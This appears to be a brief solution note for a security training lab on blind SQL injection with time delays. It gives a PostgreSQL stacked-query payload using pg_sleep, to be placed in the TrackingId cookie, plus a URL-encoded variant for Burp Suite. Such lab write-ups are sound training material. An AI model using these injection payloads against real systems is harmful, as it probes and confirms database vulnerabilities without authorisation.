
### Blind SQL injection with time delays : PRACTITIONER

---

Try the PostgreSQL delay payload in the `TrackingId` cookie.

```SQL
'; SELECT pg_sleep(10)-- 
```

To inject the semicolon in BurpSuite, URL encode it:
```SQL
'%3b SELECT pg_sleep(10)-- 
```

---
